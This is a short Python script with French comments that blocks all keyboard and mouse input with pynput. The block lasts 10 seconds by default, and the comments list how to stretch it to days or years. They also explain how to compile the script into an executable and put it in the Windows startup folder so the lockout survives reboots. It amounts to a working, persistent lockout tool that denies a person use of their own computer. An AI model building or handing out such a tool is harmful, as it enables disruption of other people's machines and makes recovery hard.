#Ce script bloque le clavier et la souris pendant 10S.
#l'éxécutable met quequlque seconde a se lançer mais nous vous inquietez pas il marche ;)
#si vous souhaité augmenter le temps de blocages vous pouvez
#changer le"10seconde" dans time.sleep(...).
	#1H = 3 600
	#2H = 7 200
	#3H = 10 800
	#4H = 14 400
	#5H = 18 000
	#1JOUR = 86 400
	#2JOURS = 172 800
	#3jours = 259 200
	#4JOURS = 345 600
	#5JOURS = 432 000
	#6JOURS = 518 400
	#7JOURS = 604 800
	#10 ans😆 = 315 360 000 secondes(basé sur 365 jours par an).
#préréquis:
	#python.   https://www.python.org/downloads/release/python-31314/)

	#pyautogui.   pip3 install pyautogui --break-system-packages
	#pynput.   pip3 install pynput --break-system-packages

#Pour faire un éxécutable:
		#pip install pyinstaller --break-system-packages
		#python3 -m PyInstaller --onefile BLOCK.py
#lancer a chaque démarage pour éviter que le script s'arréte si redémarage:
	#Windows :
		#Appuie sur Win + R, tape shell:startup et valide
		#Colle ton fichier lancer.bat ou BLOCK.exe dans le dossier qui s'ouvre

import pyautogui
import time
from pynput import keyboard, mouse

kb = keyboard.Listener(suppress=True)
ms = mouse.Listener(suppress=True)
kb.start()
ms.start()
time.sleep(10)
kb.stop()
ms.stop()
